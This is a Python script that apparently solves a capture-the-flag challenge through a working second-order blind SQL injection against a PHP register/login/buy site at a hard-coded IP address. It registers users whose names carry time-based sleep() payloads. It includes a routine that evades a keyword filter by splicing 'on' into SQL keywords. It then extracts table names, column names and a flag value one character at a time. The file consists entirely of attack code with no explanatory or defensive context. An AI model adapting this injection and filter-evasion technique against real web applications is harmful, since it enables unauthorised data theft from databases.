import requests

site = 'http://202.5.20.48/'
url = site + 'register.php'
url1 = site + 'login.php'
url2 = site + 'buy.php?id=1'

headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
          "Content-Type": "application/x-www-form-urlencoded"}

s = requests.session()

def reg(username):
  data = {
    'user': username,
    'pass' : '123456'
  }
  r = s.post(url,data=data,headers=headers)
  return r.content

def login(username):
  user = username.replace('on','')
  #print user
  data = {
    'user': user,
    'pass' : '123456'
  }
  r1 = s.post(url1,data=data,headers=headers)
  return r1.content

def get_sql():
  r = s.get(url2,timeout=1)

def bypasswaf(payload):
  # add on
  k = ['on','ff']
  for i in k:
    payload = payload.replace(i,i[0]+'on'+i[1:])

  l = ['select','union','where']
  for i in l:
    payload = payload.replace(i,i[:3]+'on'+i[3:])

  # l = ['limit']
  # for i in l:
  #   payload = payload.replace(i,i[:2]+'on'+i[2:])

  return payload

def exp(n):
  for i in range(33,127):
  #for i in range(97,123):
    # n = 25
    sql = "select table_name from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1"
    sql = "select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=database() limit 0,1"
    sql = "select thisi5f14g from fff1ag"
    #sql = "select 3456"
    sql = bypasswaf(sql)
    #user = "lemonkka'-(if(ord(mid((%s),%d,1))=%d,sleep(2),1))-0#" % (sql,n,i)
    user = "zzzkacaa'-(if(ord(mid((%s),%d,1))=%d,sleep(0.0001),1))-1#" % (sql,n,i)

    if 'exited' in reg(user):
      print 'exited!!!!!!!!!!!'
    login(user)
    try:
      get_sql()
    except:
      return chr(i)

for i in range(1,30):
  print i,'th: data'
  print exp(i)